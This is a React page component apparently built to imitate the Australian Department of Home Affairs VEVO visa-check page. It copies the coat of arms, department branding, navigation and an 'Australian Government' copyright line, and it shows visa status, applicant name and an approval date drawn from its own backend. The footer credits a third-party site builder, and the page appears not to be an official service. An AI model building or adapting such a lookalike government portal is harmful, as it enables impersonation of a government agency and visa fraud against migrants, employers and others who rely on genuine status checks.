import React, { useState } from 'react';
import { Search, Loader2, AlertCircle, Menu, ChevronDown, ChevronRight } from 'lucide-react';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Card, CardContent } from '../components/ui/card';
import { Alert, AlertDescription } from '../components/ui/alert';
import { Badge } from '../components/ui/badge';
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from '../components/ui/collapsible';
import { useCheckApplicationStatus } from '../hooks/useQueries';
import { normalizeApplicationKey } from '../utils/applicationStatusNormalization';

/**
 * Public visa status check page redesigned to match Australian Government Department of Home Affairs website style with dark navy header, coat of arms logo, navigation links, breadcrumbs, and bright blue content area with expandable VEVO section containing the visa check form.
 */
export default function AustralianVisaCheckPage() {
  const [applicationId, setApplicationId] = useState('');
  const [applicantEmail, setApplicantEmail] = useState('');
  const [isVevoOpen, setIsVevoOpen] = useState(true);

  const { mutate: checkStatus, data: status, isPending, error } = useCheckApplicationStatus();

  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] [AustralianVisaCheckPage] Search initiated`);
    console.log(`[${timestamp}] [AustralianVisaCheckPage] Raw Application ID: "${applicationId}"`);
    console.log(`[${timestamp}] [AustralianVisaCheckPage] Raw Applicant Email: "${applicantEmail}"`);

    const normalized = normalizeApplicationKey(applicationId, applicantEmail);
    console.log(`[${timestamp}] [AustralianVisaCheckPage] Normalized Application ID: "${normalized.applicationId}"`);
    console.log(`[${timestamp}] [AustralianVisaCheckPage] Normalized Applicant Email: "${normalized.applicantEmail}"`);
    console.log(`[${timestamp}] [AustralianVisaCheckPage] Calling mutation`);

    checkStatus({
      applicationId: normalized.applicationId,
      applicantEmail: normalized.applicantEmail,
    });
  };

  const handleReset = () => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] [AustralianVisaCheckPage] Reset clicked - clearing all state`);
    setApplicationId('');
    setApplicantEmail('');
  };

  // Format date in Australian locale (DD/MM/YYYY)
  const formatAustralianDate = (timestamp: bigint): string => {
    const date = new Date(Number(timestamp) / 1_000_000);
    return date.toLocaleDateString('en-AU', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric'
    });
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Dark Navy Header */}
      <header className="bg-govt-navy">
        <div className="container mx-auto px-4">
          {/* Top Header Bar */}
          <div className="flex items-center justify-between py-4">
            <button className="text-white p-2 hover:bg-white/10 rounded">
              <Menu className="h-6 w-6" />
            </button>
            
            <div className="flex items-center gap-4">
              <img 
                src="/assets/generated/aus-govt-logo.dim_200x80.png" 
                alt="Australian Government Coat of Arms" 
                className="h-16"
              />
              <div className="text-white">
                <div className="text-sm font-light">Australian Government</div>
                <div className="text-lg font-semibold">Department of Home Affairs</div>
              </div>
            </div>

            <button className="text-white p-2 hover:bg-white/10 rounded">
              <Search className="h-6 w-6" />
            </button>
          </div>

          {/* Navigation Links */}
          <nav className="border-t border-white/20 py-3">
            <div className="flex gap-6 text-sm">
              <a href="#" className="text-white hover:underline">ImmiAccount</a>
              <a href="#" className="text-white hover:underline">Visa Entitlement Verification Online (VEVO)</a>
              <a href="#" className="text-white hover:underline">My Tourist Refund Scheme (TRS)</a>
            </div>
          </nav>
        </div>
      </header>

      {/* Breadcrumb Navigation */}
      <div className="bg-govt-blue-light py-3">
        <div className="container mx-auto px-4">
          <nav className="flex items-center gap-2 text-sm text-white">
            <a href="#" className="hover:underline">Home</a>
            <ChevronRight className="h-4 w-4" />
            <a href="#" className="hover:underline">Visas</a>
            <ChevronRight className="h-4 w-4" />
            <span>When you have a visa</span>
          </nav>
        </div>
      </div>

      {/* Main Content Area - Bright Blue Background */}
      <div className="bg-govt-blue py-16">
        <div className="container mx-auto px-4 max-w-5xl">
          <h1 className="text-5xl font-bold text-white mb-8">
            Check visa details and conditions
          </h1>

          {/* Expandable VEVO Section */}
          <Collapsible open={isVevoOpen} onOpenChange={setIsVevoOpen}>
            <CollapsibleTrigger className="w-full bg-white/10 hover:bg-white/20 transition-colors rounded-t-lg">
              <div className="flex items-center justify-between p-6">
                <h2 className="text-2xl font-semibold text-white">Check conditions online (VEVO)</h2>
                {isVevoOpen ? (
                  <ChevronDown className="h-6 w-6 text-white" />
                ) : (
                  <ChevronRight className="h-6 w-6 text-white" />
                )}
              </div>
            </CollapsibleTrigger>
            
            <CollapsibleContent>
              <div className="bg-white rounded-b-lg p-8 shadow-lg">
                {/* Search Form */}
                <div className="mb-8">
                  <form onSubmit={handleSearch} className="space-y-6">
                    <div className="space-y-2">
                      <Label htmlFor="applicationId" className="text-govt-navy font-semibold text-base">
                        Reference Number (Application ID)
                      </Label>
                      <Input
                        id="applicationId"
                        type="text"
                        placeholder="Enter your reference number"
                        value={applicationId}
                        onChange={(e) => setApplicationId(e.target.value)}
                        required
                        className="border-gray-300 focus:border-govt-blue focus:ring-govt-blue text-base py-6"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="applicantEmail" className="text-govt-navy font-semibold text-base">
                        Email Address
                      </Label>
                      <Input
                        id="applicantEmail"
                        type="email"
                        placeholder="Enter your email address"
                        value={applicantEmail}
                        onChange={(e) => setApplicantEmail(e.target.value)}
                        required
                        className="border-gray-300 focus:border-govt-blue focus:ring-govt-blue text-base py-6"
                      />
                    </div>

                    <div className="flex gap-3">
                      <Button
                        type="submit"
                        disabled={isPending}
                        className="bg-govt-orange hover:bg-govt-orange-dark text-white font-semibold px-8 py-6 text-base"
                      >
                        {isPending ? (
                          <>
                            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                            Checking...
                          </>
                        ) : (
                          <>
                            <Search className="mr-2 h-5 w-5" />
                            Check Status
                          </>
                        )}
                      </Button>
                      {status && (
                        <Button
                          type="button"
                          variant="outline"
                          onClick={handleReset}
                          className="border-govt-navy text-govt-navy hover:bg-gray-100 font-semibold px-8 py-6 text-base"
                        >
                          Reset
                        </Button>
                      )}
                    </div>
                  </form>
                </div>

                {/* Error Display */}
                {error && (
                  <Alert variant="destructive" className="mb-6">
                    <AlertCircle className="h-4 w-4" />
                    <AlertDescription>
                      {error instanceof Error ? error.message : 'An error occurred while checking your application status.'}
                    </AlertDescription>
                  </Alert>
                )}

                {/* No Results Display */}
                {!isPending && !error && status === null && applicationId && applicantEmail && (
                  <Alert className="mb-6 border-govt-blue bg-blue-50">
                    <AlertCircle className="h-4 w-4 text-govt-blue" />
                    <AlertDescription className="text-govt-navy">
                      No application found with the provided details. Please check your Reference Number and Email address.
                    </AlertDescription>
                  </Alert>
                )}

                {/* Results Display */}
                {status && (
                  <Card className="border-govt-blue shadow-lg">
                    <CardContent className="pt-6 space-y-6">
                      {/* Prominent Applicant Name at Top */}
                      <div className="mb-6">
                        <h3 className="text-3xl font-bold text-govt-navy mb-1">
                          {status.applicantName}
                        </h3>
                        <p className="text-gray-600 text-sm">
                          Reference Number: {status.applicationId}
                        </p>
                      </div>

                      {/* Status Badge */}
                      <div className="flex items-center gap-3 pb-4 border-b">
                        <Label className="text-govt-navy font-semibold text-base">Status:</Label>
                        <Badge
                          variant={status.status.toLowerCase().includes('approved') ? 'default' : 'secondary'}
                          className={
                            status.status.toLowerCase().includes('approved')
                              ? 'bg-green-600 hover:bg-green-700 text-white px-4 py-2 text-base'
                              : 'bg-govt-blue hover:bg-govt-blue-dark text-white px-4 py-2 text-base'
                          }
                        >
                          {status.status}
                        </Badge>
                      </div>

                      {/* Visa Details Grid */}
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-2">
                        <div>
                          <Label className="text-govt-navy font-semibold text-base">Visa Type</Label>
                          <p className="text-lg mt-1 text-gray-800">{status.visaType}</p>
                        </div>
                        <div>
                          <Label className="text-govt-navy font-semibold text-base">Approval Date</Label>
                          <p className="text-lg mt-1 text-gray-800">
                            {formatAustralianDate(status.lastUpdated)}
                          </p>
                        </div>
                        <div>
                          <Label className="text-govt-navy font-semibold text-base">Email</Label>
                          <p className="text-lg mt-1 text-gray-800">{status.applicantEmail}</p>
                        </div>
                      </div>

                      {/* Comments Section */}
                      {status.comments && (
                        <div className="pt-4 border-t">
                          <Label className="text-govt-navy font-semibold text-base">Additional Information</Label>
                          <p className="text-base mt-2 text-gray-700">{status.comments}</p>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                )}
              </div>
            </CollapsibleContent>
          </Collapsible>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-gray-100 py-8 mt-12">
        <div className="container mx-auto px-4 text-center text-sm text-gray-600">
          <p>© {new Date().getFullYear()} Australian Government. Built with ❤️ using{' '}
            <a 
              href={`https://caffeine.ai/?utm_source=Caffeine-footer&utm_medium=referral&utm_content=${encodeURIComponent(window.location.hostname)}`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-govt-blue hover:underline"
            >
              caffeine.ai
            </a>
          </p>
        </div>
      </footer>
    </div>
  );
}
